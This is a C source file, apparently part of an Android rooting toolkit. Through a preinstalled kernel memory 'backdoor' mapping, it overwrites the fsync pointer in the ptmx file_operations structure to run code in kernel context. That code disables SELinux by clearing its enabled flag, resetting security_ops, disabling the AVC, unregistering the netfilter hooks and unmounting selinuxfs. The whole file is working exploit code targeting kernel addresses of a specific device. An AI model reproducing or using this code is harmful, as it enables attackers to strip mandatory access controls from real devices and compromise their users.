#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "ptmx.h"
#include "backdoor_mmap.h"

#define ARRAY_SIZE(x)  (sizeof (x) / sizeof ((x)[0]))

#define reset_security_ops_address                0xc027ec94

static unsigned long int check_reset_security_ops[] = {
  0xe59f2008, //      LDR     R2, =0xc0fa6804 [$c027eca4] ; default_security_ops
  0xe59f3008, //      LDR     R3, =0xc1150630 [$c027eca8] ; security_ops
  0xe5832000, //      STR     R2, [R3]
  0xe12fff1e, //      BX      LR
  0xc0fa6804, //                                          ; default_security_ops
  0xc1150630, //                                          ; security_ops
};

#define selinux_nf_ip_init_address                0xc0e1e748

static unsigned long int check_selinux_nf_ip_init[] = {
  0xe92d4010, //      STMPW   [SP], { R4, LR }
  0xe59f404c, //      LDR     R4, =0xc0fa861c [$c0e1e7a0]
  0xe5943000, //      LDR     R3, [R4]                    ; selinux_enabled
  0xe3530000, //      CMPS    R3, #$0
  0x0a00000e, //      BEQ     $c0e1e798
  0xe59f0040, //      LDR     R0, =0xc0c946ea [$c0e1e7a4]
  0xebe74ca2, //      BL      $c07f19f0                   ; printk
  0xe3a01003, //      MOV     R1, #$3
  0xe2840004, //      ADD     R0, R4, #$4                 ; selinux_ipv4_ops
  0xebe20650, //      BL      $c06a00b4                   ; nf_register_hooks
  0xe2501000, //      SUBS    R1, R0, #$0
  0x159f002c, //      LDRNE   R0, =0xc0c94714 [$c0e1e7a8]
  0x1a000005, //      BNE     $c0e1e794
  0xe3a01002, //      MOV     R1, #$2
  0xe2840058, //      ADD     R0, R4, #$58                ; selinux_ipv6_ops
  0xebe2064a, //      BL      $c06a00b4                   ; nf_register_hooks
  0xe2501000, //      SUBS    R1, R0, #$0
  0x0a000001, //      BEQ     $c0e1e798
  0xe59f0014, //      LDR     R0, =0xc0c94743 [$c0e1e7ac]
  0xebe74c11, //      BL      $c07f17e0
  0xe3a00000, //      MOV     R0, #$0
  0xe8bd8010, //      LDMUW   [SP], { R4, PC }
  0xc0fa861c, //                                          ; selinux_enabled
  0xc0c946ea, //
  0xc0c94714, //
  0xc0c94743, //
};

#define init_sel_fs_address                       0xc0e1e924

static unsigned long int check_init_sel_fs[] = {
  0xe92d4038, //      STMPW   [SP], { R3-R5, LR }
  0xe59f307c, //      LDR     R3, =0xc0fa861c [$c0e1e9ac] ; selinux_enabled
  0xe5934000, //      LDR     R4, [R3]
  0xe3540000, //      CMPS    R4, #$0
  0x0a00001a, //      BEQ     $c0e1e9a4
  0xe59f3070, //      LDR     R3, =0xc114f6b4 [$c0e1e9b0] ; fs_kobj
  0xe59f0070, //      LDR     R0, =0xc0c94172 [$c0e1e9b4]
  0xe59f5070, //      LDR     R5, =0xc1151668 [$c0e1e9b8] ; policy_opened
  0xe5931000, //      LDR     R1, [R3]
  0xebd2a880, //      BL      $c02c8b50                   ; kobject_create_and_add
  0xe3500000, //      CMPS    R0, #$0
  0xe5850024, //      STR     R0, [R5, #$24]              ; selinuxfs_kobj
  0x03e0400b, //      MVNEQ   R4, #$b
  0x0a000011, //      BEQ     $c0e1e9a4
  0xe59f0058, //      LDR     R0, =0xc0fa8ab8 [$c0e1e9bc] ; sel_fs_type
  0xebccb909, //      BL      $c014cd8c                   ; register_filesystem
  0xe2504000, //      SUBS    R4, R0, #$0
  0x0a000002, //      BEQ     $c0e1e978
  0xe5950024, //      LDR     R0, [R5, #$24]              ; selinuxfs_kobj
  0xebd2a5ef, //      BL      $c02c8134                   ; kobject_put
  0xea00000a, //      B       $c0e1e9a4
  0xe59f003c, //      LDR     R0, =0xc0fa8ab8 [$c0e1e9bc] ; sel_fs_type
  0xe1a01004, //      MOV     R1, R4
  0xebccc541, //      BL      $c014fe8c                   ; kern_mount_data
  0xe3700a01, //      CMNS    R0, #$1000
  0xe5850028, //      STR     R0, [R5, #$28]              ; selinuxfs_mount
  0x9a000004, //      BLS     $c0e1e9a4
  0xe59f0028, //      LDR     R0, =0xc0c94b23 [$c0e1e9c0]
  0xebe74c15, //      BL      $c07f19f0                   ; printk
  0xe5954028, //      LDR     R4, [R5, #$28]              ; selinuxfs_mount
  0xe3a03000, //      MOV     R3, #$0
  0xe5853028, //      STR     R3, [R5, #$28]              ; selinuxfs_mount
  0xe1a00004, //      MOV     R0, R4
  0xe8bd8038, //      LDMUW   [SP], { R3-R5, PC }
  0xc0fa861c, //
  0xc114f6b4, //                                          ; fs_kobj
  0xc0c94172, //
  0xc1151668, //
  0xc0fa8ab8, //                                          ; sel_fs_type
  0xc0c94b23, //
};

#define DEFINE_CHECK(name)  { name##_address, check_##name, sizeof(check_##name) }

static struct {
  unsigned long int addr;
  const unsigned long int *expected;
  size_t size;
} check_code[] =
{
  DEFINE_CHECK(reset_security_ops),
  DEFINE_CHECK(selinux_nf_ip_init),
  DEFINE_CHECK(init_sel_fs),
};

static bool
check_unlock_code(void)
{
  unsigned long int *p;
  int pos;
  bool ret = true;

  for (pos = 0; pos < ARRAY_SIZE(check_code); pos++) {
    p = backdoor_convert_to_mmaped_address((void *)check_code[pos].addr);

    if (memcmp(p, check_code[pos].expected, check_code[pos].size) != 0) {
      int i;

      printf("kernel code doesn't match at 0x%08x !!\n", check_code[pos].addr);
      for (i = 0; i < check_code[pos].size / sizeof (check_code[pos].expected[0]); i++) {
        printf("  0x%08x\n", p[i]);
      }

      printf("\n");

      ret = false;
    }
  }

  return ret;
}

struct nf_hook_ops;

static struct nf_hook_ops *selinux_ipv4_ops = (void *)0xc0fa8620;
static struct nf_hook_ops *selinux_ipv6_ops = (void *)0xc0fa8674;

#define ARRAY_SIZE_selinux_ipv4_ops 3
#define ARRAY_SIZE_selinux_ipv6_ops 2

void (*nf_unregister_hooks)(struct nf_hook_ops *reg, unsigned int n) = (void *)0xc06a0000;

static void selinux_nf_ip_exit(void)
{
  nf_unregister_hooks(selinux_ipv4_ops, ARRAY_SIZE_selinux_ipv4_ops);
  nf_unregister_hooks(selinux_ipv6_ops, ARRAY_SIZE_selinux_ipv6_ops);
}

struct kobject;
struct vfsmount;
struct file_system_type;

static struct kobject *selinuxfs_kobj = (void *)0xc115168c;
static struct vfsmount *selinuxfs_mount = (void *)0xc1151690;
static struct file_system_type *sel_fs_type = (void *)0xc0fa8ab8;

static void (*kobject_put)(struct kobject *kobj) = (void *)0xc02c8134;
static void (*kern_unmount)(struct vfsmount *mnt) = (void *)0xc014ff30;
static int (*unregister_filesystem)(struct file_system_type *) = (void *)0xc014cc88;

static void exit_sel_fs(void)
{
  kobject_put(selinuxfs_kobj);
  kern_unmount(selinuxfs_mount);
  unregister_filesystem(sel_fs_type);
}

static int *p_ss_initialized = (void *)0xc11531a4;
static int *p_selinux_enabled = (void *)0xc0fa861c;

static void (*reset_security_ops)(void) = (void *)0xc027ec94;
static void (*avc_disable)(void) = (void *)0xc0280fb0;

int result_selinux_set_disable = false;

static void
selinux_set_disable(void)
{
  result_selinux_set_disable = false;

  if (*p_ss_initialized) {
    return;
  }

  *p_selinux_enabled = 0;

  reset_security_ops();

  avc_disable();

  selinux_nf_ip_exit();

  exit_sel_fs();

  result_selinux_set_disable = true;
}

static bool
run_selinux_set_disable(void)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return result_selinux_set_disable;
}

static bool
do_unlock(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  bool ret = false;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  if (check_unlock_code()) {
    ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
    *ptmx_fsync_address = selinux_set_disable;

    ret = run_selinux_set_disable();

    *ptmx_fsync_address = NULL;
  }

  backdoor_close_mmap();

  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
